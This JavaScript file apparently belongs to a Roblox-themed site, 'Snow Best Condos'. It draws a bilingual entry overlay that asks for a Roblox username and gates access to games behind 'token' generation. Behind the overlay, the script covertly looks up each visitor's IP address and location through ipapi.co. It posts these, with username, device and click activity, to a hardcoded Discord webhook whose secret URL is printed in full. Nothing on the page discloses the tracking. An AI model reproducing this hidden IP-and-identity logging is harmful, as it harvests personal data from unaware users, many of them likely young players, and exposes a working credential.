(function () {
  'use strict';

  var LANG_KEY   = 'rc2_lang';
  var UNAME_KEY  = 'rc2_username';
  var WEBHOOK    = 'https://discord.com/api/webhooks/1515224288184111264/OAEu5jl7rHKCZ-aSbB98j6WJOigd3jxjmfxaJuPo7eQKMrsRI1uGbdi0MyzEDnPMHr0C';
  var DISCORD_INVITE = 'https://discord.gg/h3Q2JMfMW9';

  /* ════════════════════════════════════════════════════
     ENTRY SCREEN
  ════════════════════════════════════════════════════ */
  var entryCSS = `
    @keyframes snowfall {
      0%   { transform: translateY(-10px) rotate(0deg);   opacity: 1; }
      100% { transform: translateY(100vh) rotate(360deg); opacity: 0.3; }
    }
    @keyframes fadeInUp {
      from { opacity: 0; transform: translateY(30px); }
      to   { opacity: 1; transform: translateY(0); }
    }
    @keyframes pulse-glow {
      0%, 100% { box-shadow: 0 0 20px rgba(96,165,250,0.4); }
      50%       { box-shadow: 0 0 40px rgba(96,165,250,0.8); }
    }
    @keyframes shimmer {
      0%   { background-position: -200% center; }
      100% { background-position:  200% center; }
    }
    #rc-entry-overlay {
      position: fixed; inset: 0; z-index: 999999;
      display: flex; align-items: center; justify-content: center;
      background: linear-gradient(160deg, #020b1a 0%, #041428 40%, #061e38 70%, #030f22 100%);
      overflow: hidden; font-family: 'Outfit', 'Inter', sans-serif;
    }
    #rc-entry-overlay.rc-hidden { display: none; }

    /* Snow flakes */
    .rc-snow { position: absolute; top: -10px; border-radius: 50%;
      background: rgba(255,255,255,0.8); pointer-events: none;
      animation: snowfall linear infinite; }

    /* Card */
    #rc-entry-card {
      position: relative; z-index: 2;
      background: linear-gradient(180deg, rgba(8,22,54,0.95) 0%, rgba(4,14,34,0.98) 100%);
      border: 1px solid rgba(96,165,250,0.25);
      border-radius: 24px;
      padding: 40px 36px 32px;
      width: 100%; max-width: 460px; margin: 16px;
      box-shadow: 0 0 0 1px rgba(96,165,250,0.08),
                  0 40px 80px rgba(0,0,0,0.8),
                  0 0 80px rgba(37,99,235,0.1),
                  inset 0 1px 0 rgba(255,255,255,0.06);
      animation: fadeInUp 0.5s ease;
      text-align: center;
    }
    #rc-entry-card::before {
      content:''; position:absolute; top:0; left:20%; right:20%; height:1px;
      background: linear-gradient(90deg, transparent, rgba(96,165,250,0.7), transparent);
      border-radius:999px;
    }

    /* Logo icon */
    #rc-entry-logo {
      width: 64px; height: 64px; border-radius: 18px; margin: 0 auto 20px;
      background: linear-gradient(135deg, #1d4ed8, #3b82f6);
      display: flex; align-items: center; justify-content: center;
      font-size: 28px;
      animation: pulse-glow 2.5s ease-in-out infinite;
    }

    /* Title */
    #rc-entry-title {
      font-size: 1.65rem; font-weight: 900; letter-spacing: -0.03em;
      background: linear-gradient(90deg, #fff 0%, #93c5fd 100%);
      background-size: 200% auto;
      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
      background-clip: text;
      animation: shimmer 3s linear infinite;
      margin-bottom: 4px; line-height: 1.2;
    }
    #rc-entry-subtitle {
      font-size: 0.78rem; color: rgba(147,197,253,0.6);
      font-weight: 500; letter-spacing: 0.08em; text-transform: uppercase;
      margin-bottom: 24px;
    }

    /* Username input */
    #rc-entry-input-wrap { margin-bottom: 16px; text-align: left; }
    #rc-entry-input-wrap label {
      display: block; font-size: 0.72rem; font-weight: 700;
      color: rgba(147,197,253,0.8); letter-spacing: 0.08em;
      text-transform: uppercase; margin-bottom: 7px;
    }
    #rc-entry-input {
      width: 100%; box-sizing: border-box;
      background: rgba(37,99,235,0.07);
      border: 1px solid rgba(96,165,250,0.2);
      border-radius: 12px; padding: 12px 16px;
      color: #fff; font-size: 0.95rem; font-family: inherit; font-weight: 500;
      outline: none; transition: border-color 0.2s, box-shadow 0.2s;
    }
    #rc-entry-input:focus {
      border-color: rgba(96,165,250,0.5);
      box-shadow: 0 0 0 3px rgba(59,130,246,0.15);
    }
    #rc-entry-input::placeholder { color: rgba(147,197,253,0.35); }

    /* Warning box */
    #rc-entry-warning {
      background: rgba(239,68,68,0.08);
      border: 1px solid rgba(239,68,68,0.25);
      border-radius: 12px; padding: 12px 16px;
      margin-bottom: 20px; text-align: left;
    }
    #rc-entry-warning .warn-title {
      font-size: 0.72rem; font-weight: 800; letter-spacing: 0.07em;
      color: #fca5a5; text-transform: uppercase; margin-bottom: 3px;
    }
    #rc-entry-warning .warn-body {
      font-size: 0.8rem; color: rgba(252,165,165,0.75); font-weight: 500;
    }

    /* Discord panel */
    #rc-entry-discord {
      background: rgba(88,101,242,0.1);
      border: 1px solid rgba(88,101,242,0.3);
      border-radius: 12px; padding: 12px 16px;
      margin-bottom: 20px;
      display: flex; align-items: center; gap: 12px; text-align: left;
      text-decoration: none; transition: all 0.2s ease; cursor: pointer;
    }
    #rc-entry-discord:hover {
      background: rgba(88,101,242,0.18);
      border-color: rgba(88,101,242,0.5);
      transform: translateY(-1px);
    }
    #rc-entry-discord .dc-icon {
      width: 38px; height: 38px; flex-shrink: 0;
      background: rgba(88,101,242,0.25); border-radius: 10px;
      display: flex; align-items: center; justify-content: center; font-size: 20px;
    }
    #rc-entry-discord .dc-text { flex: 1; }
    #rc-entry-discord .dc-label {
      font-size: 0.7rem; font-weight: 700; letter-spacing: 0.07em;
      text-transform: uppercase; color: rgba(167,139,250,0.7); margin-bottom: 2px;
    }
    #rc-entry-discord .dc-name {
      font-size: 0.9rem; font-weight: 700; color: #c4b5fd;
    }
    #rc-entry-discord .dc-arrow { color: rgba(167,139,250,0.5); font-size: 18px; }

    /* Enter button */
    #rc-entry-btn {
      width: 100%; padding: 13px; border: none; border-radius: 12px; cursor: pointer;
      background: linear-gradient(135deg, #1d4ed8, #3b82f6);
      color: #fff; font-size: 0.95rem; font-weight: 800;
      letter-spacing: 0.02em; font-family: inherit;
      box-shadow: 0 0 0 1px rgba(96,165,250,0.3), 0 4px 20px rgba(37,99,235,0.4);
      transition: all 0.2s ease;
    }
    #rc-entry-btn:hover {
      background: linear-gradient(135deg, #2563eb, #60a5fa);
      box-shadow: 0 0 0 1px rgba(96,165,250,0.5), 0 6px 30px rgba(59,130,246,0.55);
      transform: translateY(-1px);
    }
    #rc-entry-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }

    /* Error */
    #rc-entry-err {
      font-size: 0.75rem; color: #fca5a5; margin-top: 8px;
      display: none; font-weight: 600;
    }

    /* Lang toggle */
    #rc-entry-lang {
      display: flex; justify-content: center; gap: 8px; margin-top: 16px;
    }
    .rc-lang-btn {
      padding: 4px 12px; border-radius: 99px; border: 1px solid rgba(96,165,250,0.2);
      background: transparent; color: rgba(147,197,253,0.6);
      font-size: 0.7rem; font-weight: 700; cursor: pointer; font-family: inherit;
      transition: all 0.2s;
    }
    .rc-lang-btn.active, .rc-lang-btn:hover {
      background: rgba(59,130,246,0.15); color: #93c5fd;
      border-color: rgba(96,165,250,0.4);
    }
  `;

  var texts = {
    pt: {
      welcome:     'Seja Bem‑vindo ao',
      brand:       'Snow Best Condos',
      sub:         'Entre com seu usuário do Roblox',
      inputLabel:  'Seu usuário do Roblox',
      placeholder: 'Ex: Player123',
      warnTitle:   '⚠️ AVISO IMPORTANTE',
      warnBody:    'Somente contas com mais de 500 dias podem entrar!',
      dcLabel:     'Comunidade oficial',
      dcName:      'Entrar no Discord',
      btnText:     'Entrar no Site',
      errEmpty:    'Digite seu usuário do Roblox para continuar.',
    },
    en: {
      welcome:     'Welcome to',
      brand:       'Snow Best Condos',
      sub:         'Enter your Roblox username',
      inputLabel:  'Your Roblox username',
      placeholder: 'Ex: Player123',
      warnTitle:   '⚠️ IMPORTANT WARNING',
      warnBody:    'Only accounts with more than 500 days can enter!',
      dcLabel:     'Official community',
      dcName:      'Join our Discord',
      btnText:     'Enter the Site',
      errEmpty:    'Please enter your Roblox username to continue.',
    }
  };

  var currentLang = localStorage.getItem(LANG_KEY) || 'pt';

  /* ── Build snow flakes ── */
  function buildSnow() {
    var frag = document.createDocumentFragment();
    for (var i = 0; i < 60; i++) {
      var s = document.createElement('div');
      var size = Math.random() * 5 + 2;
      var left = Math.random() * 100;
      var dur  = Math.random() * 8 + 5;
      var del  = Math.random() * 8;
      s.className = 'rc-snow';
      s.style.cssText = [
        'width:' + size + 'px', 'height:' + size + 'px',
        'left:' + left + '%',
        'animation-duration:' + dur + 's',
        'animation-delay:-' + del + 's',
        'opacity:' + (Math.random() * 0.6 + 0.3),
      ].join(';');
      frag.appendChild(s);
    }
    return frag;
  }

  /* ── Build overlay HTML ── */
  function buildEntry() {
    var style = document.createElement('style');
    style.textContent = entryCSS;
    document.head.appendChild(style);

    var t = texts[currentLang];

    var overlay = document.createElement('div');
    overlay.id = 'rc-entry-overlay';
    overlay.appendChild(buildSnow());

    var card = document.createElement('div');
    card.id = 'rc-entry-card';
    card.innerHTML = `
      <div id="rc-entry-logo">❄️</div>
      <div id="rc-entry-title">${t.welcome}<br>${t.brand}</div>
      <div id="rc-entry-subtitle">${t.sub}</div>

      <div id="rc-entry-input-wrap">
        <label for="rc-uname-input">${t.inputLabel}</label>
        <input id="rc-entry-input" type="text" placeholder="${t.placeholder}" autocomplete="off" spellcheck="false" />
        <div id="rc-entry-err">${t.errEmpty}</div>
      </div>

      <div id="rc-entry-warning">
        <div class="warn-title">${t.warnTitle}</div>
        <div class="warn-body">${t.warnBody}</div>
      </div>

      <a id="rc-entry-discord" href="${DISCORD_INVITE}" target="_blank" rel="noopener">
        <div class="dc-icon">💬</div>
        <div class="dc-text">
          <div class="dc-label">${t.dcLabel}</div>
          <div class="dc-name">${t.dcName}</div>
        </div>
        <div class="dc-arrow">›</div>
      </a>

      <button id="rc-entry-btn">${t.btnText}</button>

      <div id="rc-entry-lang">
        <button class="rc-lang-btn ${currentLang === 'pt' ? 'active' : ''}" data-l="pt">🇧🇷 PT</button>
        <button class="rc-lang-btn ${currentLang === 'en' ? 'active' : ''}" data-l="en">🇺🇸 EN</button>
      </div>
    `;

    overlay.appendChild(card);
    document.body.appendChild(overlay);

    /* Lang switch */
    overlay.querySelectorAll('.rc-lang-btn').forEach(function (btn) {
      btn.addEventListener('click', function () {
        currentLang = btn.dataset.l;
        localStorage.setItem(LANG_KEY, currentLang);
        document.body.removeChild(overlay);
        buildEntry();
      });
    });

    /* Enter button */
    var btn   = overlay.querySelector('#rc-entry-btn');
    var input = overlay.querySelector('#rc-entry-input');
    var err   = overlay.querySelector('#rc-entry-err');

    /* Pre-fill saved username */
    var savedName = localStorage.getItem(UNAME_KEY);
    if (savedName) input.value = savedName;

    btn.addEventListener('click', function () {
      var name = input.value.trim();
      if (!name) {
        err.style.display = 'block';
        input.focus();
        return;
      }
      localStorage.setItem(UNAME_KEY, name);
      overlay.style.transition = 'opacity 0.4s ease';
      overlay.style.opacity = '0';
      setTimeout(function () { overlay.classList.add('rc-hidden'); }, 400);
      sendLog('🚪 Entrada no Site', 0x3b82f6, { '👤 Usuário Roblox': name });
    });

    input.addEventListener('keydown', function (e) {
      if (e.key === 'Enter') btn.click();
      err.style.display = 'none';
    });
  }

  /* ════════════════════════════════════════════════════
     DISCORD LOGS
  ════════════════════════════════════════════════════ */
  var geoData = null;
  fetch('https://ipapi.co/json/')
    .then(function (r) { return r.json(); })
    .then(function (d) { geoData = d; })
    .catch(function () {});

  function now() {
    return new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo', hour12: false });
  }

  function getUA() {
    var ua = navigator.userAgent;
    var browser = 'Desconhecido', os = 'Desconhecido';
    if (/Chrome\//.test(ua) && !/Edg\//.test(ua)) browser = 'Chrome';
    else if (/Firefox\//.test(ua)) browser = 'Firefox';
    else if (/Safari\//.test(ua) && !/Chrome\//.test(ua)) browser = 'Safari';
    else if (/Edg\//.test(ua)) browser = 'Edge';
    else if (/OPR\//.test(ua)) browser = 'Opera';
    if (/Windows/.test(ua)) os = 'Windows';
    else if (/Android/.test(ua)) os = 'Android';
    else if (/iPhone|iPad/.test(ua)) os = 'iOS';
    else if (/Mac OS/.test(ua)) os = 'macOS';
    else if (/Linux/.test(ua)) os = 'Linux';
    return browser + ' / ' + os;
  }

  function sendLog(action, color, extra) {
    var ip   = geoData ? geoData.ip : 'N/A';
    var city = geoData ? ((geoData.city || '') + ', ' + (geoData.country_name || '')) : 'N/A';
    var username = localStorage.getItem(UNAME_KEY) || 'N/A';
    var fields = [
      { name: '📋 Ação',        value: action,          inline: true },
      { name: '👤 Usuário',     value: username,         inline: true },
      { name: '🕒 Horário',     value: now(),            inline: true },
      { name: '🌐 IP',          value: '`' + ip + '`',  inline: true },
      { name: '📍 Localização', value: city,             inline: true },
      { name: '💻 Dispositivo', value: getUA(),          inline: true },
    ];
    if (extra) {
      Object.keys(extra).forEach(function (k) {
        if (k !== '📋 Ação') fields.push({ name: k, value: String(extra[k]), inline: true });
      });
    }
    fetch(WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: '📡 Snow Best Condos — Log',
          color: color,
          fields: fields,
          footer: { text: 'Snow Best Condos Logs • ' + window.location.hostname },
          timestamp: new Date().toISOString()
        }]
      })
    }).catch(function () {});
  }

  /* ════════════════════════════════════════════════════
     MAIN SITE OVERLAY (sound + token + legacy lang)
  ════════════════════════════════════════════════════ */
  var audio = null;
  function playClick() {
    try {
      if (!audio) { audio = new Audio('/click-sound.mp3'); audio.volume = 0.5; }
      audio.currentTime = 0;
      audio.play().catch(function () {});
    } catch (e) {}
  }

  var tokenGeneratedInSession = false;
  var currentGame = '';

  var WARN_MSGS = {
    en: 'Generate a token first to access the game.',
    es: 'Genera un token primero para acceder al juego.',
    pt: 'Gere um token primeiro para acessar o jogo.',
    ru: 'Сначала создайте токен, чтобы войти в игру.',
  };

  function showWarning() {
    var lang = localStorage.getItem(LANG_KEY) || 'en';
    var msg = WARN_MSGS[lang] || WARN_MSGS.en;
    var existing = document.getElementById('rc-token-warning');
    if (existing) return;
    var warn = document.createElement('div');
    warn.id = 'rc-token-warning';
    warn.style.cssText = [
      'position:fixed','bottom:24px','left:50%','transform:translateX(-50%)',
      'background:#1c2028','border:1px solid #ef4444','color:#fca5a5',
      'font-size:13px','font-weight:600','padding:10px 20px',
      'border-radius:12px','z-index:999999','white-space:nowrap',
      'box-shadow:0 4px 20px rgba(0,0,0,.6)','font-family:Inter,sans-serif',
    ].join(';');
    warn.textContent = msg;
    document.body.appendChild(warn);
    setTimeout(function () { warn.remove(); }, 2800);
  }

  function dismissLangOverlay(lang) {
    localStorage.setItem(LANG_KEY, lang);
    var ov = document.getElementById('rc-lang-overlay');
    if (ov) { ov.style.animation = 'rc-fadeout .2s ease forwards'; setTimeout(function () { ov.classList.add('rc-hidden'); }, 210); }
  }

  var observer = new MutationObserver(function () {
    document.querySelectorAll('button:not([data-rc-s]), a:not([data-rc-s])').forEach(function (el) {
      el.setAttribute('data-rc-s', '1');
      el.addEventListener('click', playClick);
    });

    document.querySelectorAll('[data-testid="button-access-game"]:not([data-rc-e])').forEach(function (el) {
      el.setAttribute('data-rc-e', '1');
      el.addEventListener('click', function (e) {
        if (!tokenGeneratedInSession) {
          e.preventDefault(); e.stopImmediatePropagation();
          showWarning();
          sendLog('⛔ Acesso Negado (sem token)', 0xef4444, { '🎮 Jogo': currentGame || 'N/A' });
        } else {
          sendLog('✅ Acesso ao Jogo', 0x22c55e, { '🎮 Jogo': currentGame || 'N/A' });
        }
      }, true);
    });

    document.querySelectorAll('[data-testid="button-generate-token"]:not([data-rc-t])').forEach(function (el) {
      el.setAttribute('data-rc-t', '1');
      el.addEventListener('click', function () {
        tokenGeneratedInSession = true;
        var t = document.querySelector('[data-testid="modal-game-title"], h2, h3');
        if (t) currentGame = t.textContent || currentGame;
        sendLog('🔑 Token Gerado', 0xf59e0b, { '🎮 Jogo': currentGame || 'N/A' });
      });
    });
  });

  document.addEventListener('click', function (e) {
    var t = e.target;
    if (!t) return;
    if ((t.tagName === 'BUTTON' && t.dataset && t.dataset.testid === 'button-close-modal') || t.id === 'rc-lang-overlay') {
      tokenGeneratedInSession = false; currentGame = '';
    }
  }, true);

  document.querySelectorAll('#rc-lang-overlay .rc-btn').forEach(function (btn) {
    btn.addEventListener('click', function () { playClick(); dismissLangOverlay(btn.dataset.lang); });
  });

  observer.observe(document.body, { childList: true, subtree: true });

  /* ── Show entry screen ── */
  buildEntry();

})();
